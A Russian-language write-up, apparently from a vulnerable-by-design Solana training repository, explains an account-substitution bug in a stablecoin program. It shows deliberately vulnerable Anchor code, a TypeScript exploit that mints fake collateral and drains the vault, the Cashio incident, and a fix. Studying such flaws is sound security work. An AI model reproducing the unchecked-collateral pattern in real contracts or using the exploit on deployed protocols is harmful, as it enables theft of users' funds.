# 02 — Подмена аккаунта-обеспечения (fake collateral)

**Класс:** Account substitution — отсутствие проверки `mint`/владельца у
«доказательства обеспечения».
**Файлы:** `programs/vuln02_account_substitution/`, `tests/02_account_substitution.test.ts`.
**Последствие:** неограниченная эмиссия стейблкоина и выкуп реального
обеспечения из протокола.

## 1. Суть уязвимости

Стейблкоин-протокол разрешает эмитировать стейблы под залог: `mint_stable`
считывает `collateral_ata.amount` — «сколько у тебя залоговых токенов» — и
эмитирует столько же стейблов. Уязвимость: аккаунт `collateral_ata`
**не проверяется** на:

- `mint` (токен того ли обеспечения?),
- владельца,
- принадлежность протоколу.

Атакующий создаёт **свой собственный mint**, выпускает себе 1 миллион
бесполезных токенов и передаёт свой ATA как «обеспечение». Программа видит
`amount = 1_000_000` и выпускает 1 миллион стейблов, которые затем **выкупает
реальным залогом честных пользователей** через redeem.

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct MintStable<'info> {
    #[account(mut)]
    pub state: Account<'info, CoinState>,
    /// CHECK: БАГ — это якобы «ATA с залогом», но mint/owner не проверяются
    pub collateral_ata: UncheckedAccount<'info>,
    #[account(
        mut,
        mint::decimals = 6,
        mint::authority = state,          // выпуск только протоколом
        constraint = stable_mint.key() == state.stable_mint
    )]
    pub stable_mint: Account<'info, Mint>,
    #[account(mut, seeds = [b"state"], bump)]
    pub state_account: Account<'info, CoinState>,
    pub user: Signer<'info>,              // подпись нужна, но проверять нечего
    pub token_program: Program<'info, Token>,
}

pub fn mint_stable(ctx: Context<MintStable>, amount: u64) -> Result<()> {
    // Читаем «обеспечение» как сырые байты — контекст не накладывает условий
    let data = ctx.accounts.collateral_ata.try_borrow_data()?;
    let collateral = u64::from_le_bytes(data[64..72].try_into().unwrap());

    require!(collateral >= amount, Fault::InsufficientCollateral);
    // ... эмитируем `amount` стейблов пользователю ...
}
```

Проверка `collateral >= amount` честная, но **число взято из аккаунта
атакующего**.

## 3. Как эксплуатируется

Тест `tests/02_account_substitution.test.ts`:

1. Честный пользователь вносит 500 реальных залоговых токенов в vault.
2. Атакующий делает `createMint` своего мусорного токена и `mintTo` себе 1M.
3. Атакующий вызывает `mint_stable(1_000_000)`, передав **свой ATA с мусором**
   как `collateral_ata`. Программа видит amount=1M — эмитирует 1M стейблов.
4. Атакующий вызывает `redeem_stable`: возвращает 1M стейблов, программа
   сжигает их и отдаёт **реальные залоговые токены из vault**.

```ts
// фейковое обеспечение: 1M токенов СВОЕГО минта
trashMint = await createMint(...);
trashAta  = await createAccount(..., trashMint, attacker.publicKey);
await mintTo(... trashAta ..., 1_000_000);

await program.methods.mintStable(new BN(1_000_000)).accounts({
  collateralAta: trashAta,   // БАГ: любой аккаунт примется за «залог»
  stableMint, state, user: attacker.publicKey,
}).signers([attacker]).rpc();

await program.methods.redeemStable(new BN(1_000_000)).accounts({
  collateralDestAta: attackerCollateralAta, // сюда придут ЧЕСТНЫЕ залоговые
  ...
}).signers([attacker]).rpc();
```

## 4. Результат атаки (проверяется тестом)

```ts
assert.equal((await tokenBalance(attackerStableAta)).toString(), "0"); // стейблы сожжены
assert.equal((await tokenBalance(attackerCollateralAta)).toString(), "500"); // ВЕСЬ честный залог
assert.equal((await tokenBalance(vaultPda)).toString(), "0");          // протокол пуст
```

Протокол потерял все реальные активы; атакующий не потратил ничего, кроме
комиссий.

## 5. Реальный кейс: Cashio (март 2022, ~$28M)

Протокол **Cashio** (стейбл CASH на Solana) эмитировал стейблы под «обеспечение»,
которым мог быть практически любой SPL-токен: проверки минта/владельца у
аккаунта-обеспечения отсутствовали. Атакующий напечатал worthless-токены,
эмитировал CASH и выкупил USDC из системы. Ущерб ~$28 млн. Автор вернул часть
средств, но класс ошибки стал хрестоматийным: **любой счётчик, описывающий
стоимость, должен быть привязан к конкретному, проверенному активу**.

## 6. Исправление

```rust
#[derive(Accounts)]
pub struct MintStableFixed<'info> {
    #[account(mut, seeds = [b"state"], bump)]
    pub state: Account<'info, CoinState>,
    #[account(
        mut,
        constraint = collateral_ata.mint == state.collateral_mint  // ТОЛЬКО настоящий минт
        @ Fault::WrongCollateralMint,
        constraint = collateral_ata.owner == user.key()            // принадлежит вызывающему
        @ Fault::WrongCollateralOwner
    )]
    pub collateral_ata: Account<'info, TokenAccount>,
    #[account(mut, mint::authority = state, constraint = stable_mint.key() == state.stable_mint)]
    pub stable_mint: Account<'info, Mint>,
    pub user: Signer<'info>,
    pub token_program: Program<'info, Token>,
}
```

Правила:

1. Любой аккаунт, играющий роль «обеспечения»/«цены»/«остатка», должен быть
   типизирован (`Account<TokenAccount>`) и привязан к минту протокола.
2. Ещё лучше: залог переводится в vault при депозите, а эмитировать разрешается
   строго на величину **записанного** в протокольном состоянии залога — тогда
   подменять нечего.
3. `UncheckedAccount` в чувствительной инструкции — почти всегда баг.

## 7. Запуск

```bash
./scripts/run_tests.sh tests/02_account_substitution.test.ts
```
